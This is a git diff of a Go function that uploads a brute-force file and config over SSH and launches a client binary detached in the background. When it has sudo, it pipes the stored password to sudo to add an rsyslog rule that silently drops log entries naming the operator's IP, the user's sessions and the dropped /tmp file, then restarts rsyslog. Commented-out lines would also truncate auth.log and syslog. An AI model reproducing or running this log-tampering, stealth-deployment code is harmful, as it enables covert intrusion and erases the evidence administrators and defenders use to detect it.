@@ -28,10 +28,7 @@ var SidString string
 var Search = true
 
 func SendBf(confa vars.Config) {
-	red := "\033[31m"
-	green := "\033[32m"
-	// yellow := "\033[33m"
-	reset := "\033[0m"           // Reset to default color
+	// Reset to default color
 	filePath := "../client/main" // replace with your file path
 	configFile := "config.toml"
 	bfFile := "test.csv"
@@ -140,7 +137,7 @@ func SendBf(confa vars.Config) {
 			fileData = append(fileData, []byte(seconfSomething)...)
 		}
 		encodedString := base64.StdEncoding.EncodeToString(fileData)
-		fmt.Println(encodedString)
+
 		StringToSend = append(StringToSend, encodedString)
 	}
 
@@ -163,31 +160,41 @@ func SendBf(confa vars.Config) {
 
 	// isSudo = false
 	if isSudo {
-		fmt.Println(string(red), "IS SUDO", string(reset))
+		fmt.Println(string(vars.Red), "IS SUDO", string(vars.Reset))
 		fileName := path.Base(confa.Flags.MainFile)
-		rsyslogCommand := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "1s/^/if (\$msg contains \"%s\" or \$msg contains \"Session\" or \$msg contains \"Removed session\" or \$msg contains \"session opened for user %s\" or \$msg contains \"session closed for user %s\" or \$msg contains \"of user %s.\" or \$msg contains \"\/tmp\/%s\") then stop\n/" /etc/rsyslog.d/50-default.conf'`+"\n", confa.Client.Pass, confa.Client.Host, confa.Client.User, confa.Client.User, confa.Client.User, fileName)
-		rsyslogRestart := ("bash -c 'echo %s | sudo systemctl restart rsyslog ' \n ")
+		rsyslogCommand := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "1s/^/if (\$msg contains \"%s\" or \$msg contains \"restart rsyslog\" or \$msg contains \"Session\" or \$msg contains \"Removed session\" or \$msg contains \"session opened for user %s\" or \$msg contains \"session closed for user %s\" or \$msg contains \"of user %s.\" or \$msg contains \"\/tmp\/%s\") then stop\n/" /etc/rsyslog.d/50-default.conf'`+"\n", confa.Client.Pass, "192.168.23.61", confa.Client.User, confa.Client.User, confa.Client.User, fileName)
+		rsyslogRestart := (fmt.Sprintf("bash -c 'echo %s | sudo -S systemctl restart rsyslog' \n ", confa.Client.Pass))
+		// ClearAuthLog := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "$(($(wc -l < /var/log/auth.log) - 10)),\$d" /var/log/auth.log'`, confa.Client.Pass)
+		// // ClearSyslog := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "$(($(wc -l < /var/log/syslog) - 10)),\$d" /var/log/syslog'`, confa.Client.Pass)
 		commands = append(commands, rsyslogCommand)
 		commands = append(commands, rsyslogRestart)
+		// commands = append(commands, ClearAuthLog)
+		// commands = append(commands, ClearSyslog)
 		commands = append(commands, fmt.Sprintf("bash -c 'echo %s | sudo -S nohup %s > /dev/null 2>&1 & disown' \n", confa.Client.Pass, confa.Flags.MainFile))
 
 	} else {
-		fmt.Println(string(green), "JUST USER", string(reset))
+		fmt.Println(string(vars.Green), "JUST USER", string(vars.Reset))
 		commands = append(commands, fmt.Sprintf("bash -c 'nohup %s > /dev/null 2>&1 & disown' \n", confa.Flags.MainFile))
 	}
 
 	for i, command := range commands {
-		fmt.Println("Sending Command :", i+1, "from", len(commands))
-		_, err = stdin.Write([]byte(command))
+		_, err := stdin.Write([]byte(command))
 		if err != nil {
 			log.Fatalf("Failed to send command: %s", err)
 		}
+		fmt.Println("Sending Command :", i+1, "from", len(commands))
+
 		if !strings.Contains(commands[i], ">>") {
 			fmt.Println(command)
 		}
-		if strings.Contains(commands[i], "sudo systemctl restart rsyslog") {
-
-			fmt.Println("Restarting RsysLog Waiting few seconds")
+		if strings.Contains(commands[i], configFile) {
+			fmt.Println("sending Config Toml File")
+		}
+		if strings.Contains(commands[i], bfFile) {
+			fmt.Println("sending Brute Force File")
+		}
+		if strings.Contains(commands[i], "systemctl restart rsyslog") {
+			fmt.Println(string(vars.GreenString), "Restarting RsysLog Waiting few seconds", string(vars.Reset))
 			time.Sleep(10 * time.Second)
 		}
 		time.Sleep(200 * time.Millisecond)
@@ -200,7 +207,7 @@ func SendBf(confa vars.Config) {
 	if err != nil {
 		log.Fatalf("Failed to wait for session: %s", err)
 	}
-	fmt.Println("END")
+	fmt.Println(string(vars.Green), "---------END---------", string(vars.Reset))
 }
 
 func CheckStds(stdout io.Reader, confa vars.Config) {
